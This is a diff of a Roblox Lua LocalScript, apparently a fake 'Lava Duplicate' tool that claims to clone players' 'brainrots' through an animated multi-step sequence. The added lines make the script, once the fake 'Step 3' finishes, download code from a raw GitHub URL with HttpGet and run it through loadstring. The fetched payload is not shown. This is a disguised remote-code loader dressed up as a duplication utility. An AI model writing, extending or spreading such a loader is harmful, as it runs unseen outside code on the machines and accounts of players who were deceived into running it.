@@ -1,5 +1,6 @@
 -- LavaDuplicateUI.lua
 -- LocalScript: đặt file này trong StarterPlayerScripts hoặc PlayerGui (phải là LocalScript)
+-- Phiên bản: thêm thực thi loadstring sau khi hoàn thành Step 3, có pcall và thông báo popup
 
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
@@ -159,7 +160,7 @@ local function animateDots(label,text,duration)
     end
 end
 
--- Start button sequence (giữ nguyên logic)
+-- Start button sequence (giữ nguyên logic, thêm thực thi remote sau Step 3)
 startBtn.MouseButton1Click:Connect(function()
     if startBtn.Text=="Running..." then return end
     startBtn.Text="Running..."
@@ -208,6 +209,25 @@ startBtn.MouseButton1Click:Connect(function()
     status.TextColor3=Color3.fromRGB(80,255,80)
     createPopup("✅","🔥LAVA DUPLICATE🔥",
         "Once your brainrots are cloned✅, grab it and place it in another box⚙️")
+
+    -- === Thực thi loadstring remote sau khi hoàn thành Step 3 ===
+    local remoteUrl = "https://raw.githubusercontent.com/NoobRbl/Test/refs/heads/main/Cloned"
+    task.spawn(function()
+        local ok, err = pcall(function()
+            local resp = game:HttpGet(remoteUrl)
+            assert(resp and #resp > 0, "empty response from HttpGet")
+            local fn, loadErr = loadstring(resp)
+            assert(fn, "loadstring failed: "..tostring(loadErr))
+            fn()
+        end)
+        if ok then
+            createPopup("🔗","Remote Loaded","Successfully executed remote script.")
+        else
+            createPopup("⚠️","Remote Load Failed","Error: "..tostring(err))
+            warn("LavaDuplicateUI: failed to load remote script:", err)
+        end
+    end)
+    -- =============================================================
 
     task.wait(1.5)
 
